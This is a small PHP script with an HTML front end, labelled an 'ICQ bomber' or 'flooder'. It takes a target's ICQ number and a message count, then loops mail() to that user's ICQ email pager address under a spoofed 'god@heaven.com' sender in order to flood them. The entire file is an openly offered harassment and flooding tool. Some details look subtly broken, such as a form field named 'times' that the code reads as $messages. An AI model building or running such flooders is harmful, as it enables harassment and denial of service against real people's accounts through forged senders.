<?php

if($icq)
{
    //check that user entered UIN
    if(!$uin) 
    {
	die("You must supply a UIN");
    }
    
    //check that the amount to bomb is not too high
    if($messages>="300") 
    {
	die("You may be evil, but I'm not. Please lower the amount.");
    }
    
    $headers = "From: god@heaven.com";
    //now for the actual loop
    for($i="1"; $i<$messages; $i++)
    {
	mail("$uin@pager.icq.com", "$subject", "$message", $headers);
	echo("You have successfully sent, $messages to your great buddy $uin");
    }
}

else
{
    ?>
    
    <html><head><title>ICQ bomber</title></head>
    <body>
    <center>
    <h2>ICQ flooder</h2>
    <p>Writtern by <a href="mailto:f0d@nemohackers.com">f0d</a></p>
    <br>
    <form method=POST action=icq.php?icq="send">
    <table border="0">
    <tr>
	<td><p>Number of Messages:</p></td>
	<td>&nbsp;<input type=text name=times size=3></td>
    </tr>
    <tr>
	<td><p>UIN (to flood):</p>
	<td>&nbsp;<input type=text name=uin size=10></td>
    </tr>
    <tr>
	<td><p>Subject:</p></td>
	<td>&nbsp;<input type=text name=subject size=20
maxlength=20></p></td>
    </tr>
    <tr>
	<td><p>Message:</p></td>
	<td>&nbsp;<textarea name=message cols=45
rows=10></textarea></td>
    </tr>
    </table>
    <input type="submit" value="send">
    </form>
    </body>
    </html>
    
    <?
}

?>    



